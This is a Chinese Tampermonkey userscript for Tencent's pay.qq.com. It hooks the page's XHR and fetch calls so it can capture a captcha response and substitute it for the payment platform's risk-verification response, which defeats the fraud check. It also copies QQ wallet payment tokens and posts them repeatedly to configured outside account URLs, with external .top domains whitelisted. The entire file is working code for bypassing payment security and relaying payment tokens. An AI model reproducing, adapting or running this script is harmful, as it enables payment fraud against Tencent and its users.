// ==UserScript==
// @name         海豚过安全风险验证
// @namespace    https://luei.me/
// @version      1.0.0
// @description  自动判断捕获、风险替换。传码（目前只支持小刀系）、qb破风险（避免自付暂时没写）
// @author       luei
// @match        *://pay.qq.com/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @updateURL    https://luei.me/script/dolphins/chuanma.js
// @downloadURL  https://luei.me/script/dolphins/chuanma.js
// @connect      081w5a8cim.top
// @connect      8w0m6rjg3l.top
// ==/UserScript==

(function () {
    'use strict';

    const LOCAL_CAPTURE_KEY = 'capture_pay_response';

    // ---------------- 工具函数 ----------------
    const captureStorage = {
        get: () => {
            try {
                return localStorage.getItem(LOCAL_CAPTURE_KEY);
            } catch {
                return null;
            }
        },
        set: val => {
            localStorage.setItem(LOCAL_CAPTURE_KEY, val);
        },
        clear: () => {
            localStorage.removeItem(LOCAL_CAPTURE_KEY);
        }
    };

    const rand4 = () => Math.floor(Math.random() * 10000).toString().padStart(4, '0');

    const encodeItem = item => {
        const str = JSON.stringify(item);
        const bytes = new TextEncoder().encode(str);
        return btoa(String.fromCharCode(...bytes));
    };

    const showToast = (msg, type = 'info') => {
        if (!document.body) return;
        const colors = {info: '#2196F3', success: '#4CAF50', warning: '#FF9800', error: '#ff4444'};
        const toast = document.createElement('div');
        toast.textContent = msg;
        Object.assign(toast.style, {
            position: 'fixed', bottom: '60px', right: '10px',
            background: colors[type] || colors.info,
            color: '#fff', padding: '8px 12px', borderRadius: '6px',
            fontSize: '12px', zIndex: 999999
        });
        document.body.appendChild(toast);
        setTimeout(() => toast.remove(), 2000);
    };

    // ---------------- 自动传码 ----------------
    function handleResponse(responseJSON, amt = null) {
        const savedConfig = GM_getValue('giraffeConfig', null);
        if (!savedConfig) return;

        const autoSend = savedConfig.autoSend ?? false;
        const times = savedConfig.times ?? 3;
        const accounts = savedConfig.accounts ?? {};

        if (autoSend && amt !== null) {
            let targetUrl = null;
            for (const [amountStr, accountUrl] of Object.entries(accounts)) {
                const amount = Number(amountStr);
                // 差额小于 60
                if (Math.abs(amount - amt) < 60) {
                    targetUrl = accountUrl;
                    break;
                }
            }

            if (targetUrl) {
                let successCount = 0;
                const requests = Array.from({length: times}).map(() => new Promise(resolve => {
                    const item = structuredClone(responseJSON);
                    item.qqwallet_info.qqwallet_tokenId += '&' + rand4();
                    GM_xmlhttpRequest({
                        method: 'POST',
                        url: targetUrl,
                        headers: {"Content-Type": "application/x-www-form-urlencoded"},
                        data: encodeItem(item),
                        onload: (res) => {
                            if (res.responseText === "产码成功") {
                                successCount++;
                            }
                            resolve(res.responseText);
                        },
                        onerror: () => resolve()
                    });
                }));
                Promise.all(requests).then(() => showToast(`传码完成：成功 ${successCount} 次`, 'success'));
            }
        }
    }


    // ---------------- 拦截 ----------------
    const TARGET_PATHS = ["/web_save", "/mobile_save"];
    const isTargetUrl = url => TARGET_PATHS.some(path => url.includes(path));

    const isCaptureUrl = () => {
        try {
            const pf = new URL(window.location.href).searchParams.get('pf');
            // 狐狸新包
            if (!pf || pf === 'vip_m-__mds_default-html5') return false;
            // 红番茄包
            if (pf === 'pay_R-__mds_bigR_S22N_commander_id_zhg_0_v1_0_0.common2_v1-android') {
                return true;
            }
            const match = pf?.match(/^desktop_m_qq-(\d+)-android-(\d+)-/);
            return !match || match[1] !== match[2] || !match[1].startsWith('1044');
        } catch {
            return false;
        }
    };

    function getAmtFromFormData(body) {
        try {
            // body 是 send() 传入的字符串
            const params = new URLSearchParams(body);
            const wcp = params.get('wcp'); // 形如 "type=CNY&amt=123500"
            if (!wcp) return null;

            const wcpDecoded = decodeURIComponent(wcp);
            const wcpParams = new URLSearchParams(wcpDecoded);
            const amt = wcpParams.get('amt');
            return amt ? Math.floor(Number(amt) / 100) : null; // 除以100得到整数
        } catch {
            return null;
        }
    }

    function setupAPICapture() {
        // ---------------- XHR 拦截 ----------------
        const origOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function (method, url, ...args) {
            this._isTarget = isTargetUrl(url);
            return origOpen.call(this, method, url, ...args);
        };

        const origSend = XMLHttpRequest.prototype.send;
        XMLHttpRequest.prototype.send = function (...args) {
            if (!this._isTarget) return origSend.apply(this, args);

            const xhr = this;
            xhr._amt = getAmtFromFormData(args[0]);
            // 监听 readystate 事件
            const origOnreadystatechange = xhr.onreadystatechange;
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4) handleXhr(xhr);
                if (origOnreadystatechange) origOnreadystatechange.apply(xhr, arguments);
            };
            // 监听 onload 事件
            const origOnload = xhr.onload;
            xhr.onload = function () {
                handleXhr(xhr);
                if (origOnload) origOnload.apply(xhr, arguments);
            };
            return origSend.apply(this, args);
        };

        function handleXhr(xhr) {
            const responseJSON = JSON.parse(xhr.responseText)
            const ret = responseJSON.ret;
            console.log(new URL(window.location.href).searchParams.get('pf'));
            // 捕获非海豚包体验证码响应内容
            if (isCaptureUrl()) {
                if (ret === 2022) {
                    captureStorage.set(JSON.stringify(responseJSON));
                    showToast('✅ 已捕获非海豚包体验证码响应内容 (xhr)');
                }
            } else {
                // 将海豚风险验证替换为捕获的响应内容
                if (ret === 1138) {
                    const captured = captureStorage.get();
                    if (captured) {
                        Object.defineProperties(xhr, {
                            responseText: {value: captured, writable: false, configurable: true},
                            response: {value: captured, writable: false, configurable: true}
                        });
                        showToast('🔄 已将风险验证替换为验证码', 'warning');
                        captureStorage.clear();
                    } else {
                        showToast('🔄 请先捕获验证码请求再来过风险验证', 'error');
                    }
                } else if (ret === 0) {
                    if (!xhr._headlerXhr) {
                        xhr._headlerXhr = true
                        handleResponse(responseJSON, xhr._amt);
                    }
                }
            }
        }

        // ----------- fetch 拦截 -----------
        const origFetch = window.fetch;
        window.fetch = async function (input, init) {
            const url = typeof input === 'string' ? input : input?.url;
            let resp = await origFetch(input, init);
            // fetch 响应是流 → clone 一份给 handleResponseWrapper
            if (isTargetUrl(url)) {
                const cloned = resp.clone();
                const text = await cloned.text();
                try {
                    const json = JSON.parse(text);
                    const ret = json.ret
                    console.log(new URL(window.location.href).searchParams.get('pf'));
                    if (isCaptureUrl()) {
                        if (ret === 2022) {
                            captureStorage.set(JSON.stringify(json));
                            showToast('✅ 已捕获非海豚包体验证码响应内容 (fetch)');
                        }
                    } else {
                        if (ret === 1138) {
                            const captured = captureStorage.get();
                            if (captured) {
                                showToast('🔄 已将风险验证替换为验证码', 'warning');
                                captureStorage.clear();
                                return new Response(captured, {
                                    status: resp.status,
                                    statusText: resp.statusText,
                                    headers: resp.headers
                                });
                            }
                            showToast('🔄 请先捕获验证码请求再来过风险验证', 'error');
                        } else if (ret === 0) {
                            handleResponse(json, getAmtFromFormData(init?.body || ''));
                        }
                    }
                } catch (e) {
                    console.error('fetch解析失败', e);
                }
            }
            return resp;
        };
    }

    // ---------------- 面板 ----------------
    function createControlPanel() {
        if (document.getElementById('giraffe-control-panel') || document.getElementById('giraffe-mini-btn')) return;

        // 小齿轮按钮
        const miniBtn = document.createElement('div');
        miniBtn.id = 'giraffe-mini-btn';
        miniBtn.innerHTML = '⚙️';
        Object.assign(miniBtn.style, {
            position: 'fixed', top: '10px', right: '10px', background: '#000', color: '#fff',
            padding: '6px 8px', borderRadius: '6px', zIndex: 999999, fontSize: '14px',
            cursor: 'pointer', border: '1px solid #444', backdropFilter: 'none', opacity: '1'
        });
        document.body.appendChild(miniBtn);

        // 面板
        const panel = document.createElement('div');
        panel.id = 'giraffe-control-panel';
        Object.assign(panel.style, {
            position: 'fixed', top: '10px', right: '10px', background: '#000', color: '#fff',
            padding: '8px 12px', borderRadius: '8px', zIndex: 999998, width: '350px',
            border: '1px solid #444', fontFamily: 'Arial', fontSize: '12px', display: 'block',
            backdropFilter: 'none'
        });

        panel.innerHTML = `
            <div style="display:flex;justify-content:flex-start;align-items:center;margin-bottom:6px;" id="panelHeader">
                <span style="color:#4CAF50;font-weight:bold; font-size:13px;">海豚过安全风险验证(自动识别包体)</span>
            </div>
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;" id="panelCaptureStatus">
                <div style="display:flex;align-items:center;gap:6px;font-weight:bold;">
                    <div>捕获状态: <span id="captureStatus" style="color:#ff4444">✗ 未捕获</span></div>
                    <button id="clearCapture" style="background:#ff4444;color:white;border:none;padding:3px 6px;border-radius:3px;cursor:pointer;font-size:12px;line-height:1;">清除捕获</button>
                </div>
                <div style="display:flex;align-items:center;gap:6px;font-weight:bold;">
                    <label style="font-size:12px; display:flex; align-items:center; gap:4px;">
                        自动传码
                        <input type="checkbox" id="autoSendToggle" checked>
                    </label>
                    <label style="font-size:12px; display:flex; align-items:center; gap:4px;">
                        传码次数
                        <input type="number" id="defaultTimes" value="${GM_getValue('times', 3)}" style="width:40px; font-size:12px; font-weight:bold; color:#00FF00; background:#333; border:1px solid #555; border-radius:3px; text-align:center;">
                    </label>
                </div>
            </div>
            <div id="accountTable" style="margin-bottom:6px; display:none;"></div>
            <div style="justify-content:space-between;align-items:center; display:none;">
                <button id="addRowBtn" style="background:#2196F3;color:white;border:none;padding:4px 6px;border-radius:3px;cursor:pointer;font-size:12px;">＋ 添加账号</button>
                <button id="saveAccountsBtn" style="background:#4CAF50;color:white;border:none;padding:4px 6px;border-radius:3px;font-size:12px;">💾 保存配置</button>
            </div>
        `;
        document.body.appendChild(panel);

        // 折叠按钮
        const collapseBtn = document.createElement('button');
        collapseBtn.textContent = '⇕';
        collapseBtn.title = '折叠/展开账号配置面板';
        collapseBtn.style.cssText = 'background:#FF9800;color:white;border:none;padding:2px 6px;border-radius:3px;cursor:pointer;font-size:12px;margin-left:6px;';
        panel.querySelector('#panelHeader').appendChild(collapseBtn);

        let isCollapsed = true;
        collapseBtn.addEventListener('click', () => {
            isCollapsed = !isCollapsed;
            Array.from(panel.children).forEach((el, idx) => {
                if (idx < 2) return;
                el.style.display = isCollapsed ? 'none' : '';
            });
        });

        miniBtn.addEventListener('click', () => panel.style.display = panel.style.display === 'none' ? 'block' : 'none');

        const accountTable = panel.querySelector('#accountTable');

        const addAccountRow = (account = '', amount = '') => {
            const row = document.createElement('div');
            row.style.display = 'flex';
            row.style.alignItems = 'center';
            row.style.gap = '4px';
            row.style.marginBottom = '4px';

            // 账号
            const accountInput = document.createElement('input');
            accountInput.type = 'text';
            accountInput.placeholder = '账号链接';
            accountInput.value = account;
            accountInput.style.flex = '1';
            accountInput.style.color = '#4FC3F7';
            accountInput.style.fontWeight = 'bold';

            // 金额
            const amountInput = document.createElement('input');
            amountInput.type = 'text';
            amountInput.placeholder = '金额';
            amountInput.value = amount;
            amountInput.style.width = '30px';
            amountInput.style.textAlign = 'center';
            amountInput.style.color = '#FFB74D';
            amountInput.style.fontWeight = 'bold';

            // 移除
            const removeBtn = document.createElement('button');
            removeBtn.textContent = '－';
            removeBtn.style.background = '#ff4444';
            removeBtn.style.color = 'white';
            removeBtn.style.border = 'none';
            removeBtn.style.padding = '2px 6px';
            removeBtn.style.borderRadius = '3px';
            removeBtn.style.cursor = 'pointer';
            removeBtn.addEventListener('click', () => row.remove());

            row.appendChild(accountInput);
            row.appendChild(amountInput);
            row.appendChild(removeBtn);
            accountTable.appendChild(row);
        };

        panel.querySelector('#addRowBtn').addEventListener('click', () => addAccountRow());

        const savedConfig = GM_getValue('giraffeConfig', null);
        if (savedConfig) {
            panel.querySelector('#autoSendToggle').checked = savedConfig.autoSend ?? true;
            panel.querySelector('#defaultTimes').value = savedConfig.times ?? 3;
            accountTable.innerHTML = '';
            for (const [amount, accountUrl] of Object.entries(savedConfig.accounts ?? {})) addAccountRow(accountUrl, amount);
        }

        panel.querySelector('#saveAccountsBtn').addEventListener('click', () => {
            const autoSend = panel.querySelector('#autoSendToggle').checked;
            const times = Number(panel.querySelector('#defaultTimes').value);
            const accounts = {};
            accountTable.querySelectorAll('div').forEach(row => {
                const inputs = row.querySelectorAll('input');
                const accountUrl = inputs[0].value.trim();
                const amount = inputs[1].value.trim();
                if (accountUrl && amount) accounts[amount] = accountUrl;
            });
            GM_setValue('giraffeConfig', {autoSend, times, accounts});
            showToast('配置信息已保存', "success");
        });

        panel.querySelector('#clearCapture').addEventListener('click', () => {
            captureStorage.clear();
            showToast('已清除捕获内容', "warning");
        });

        function updateStatus() {
            const captureStatus = panel.querySelector('#captureStatus');
            captureStatus.textContent = captureStorage.get() ? '✓ 已捕获' : '✗ 未捕获';
            captureStatus.style.color = captureStorage.get() ? '#4CAF50' : '#ff4444';
        }

        setInterval(updateStatus, 1000);
    }

    window.addEventListener('load', () => {
        if (window.top === window.self) {
            createControlPanel();
        }
        setupAPICapture();
    });

})();
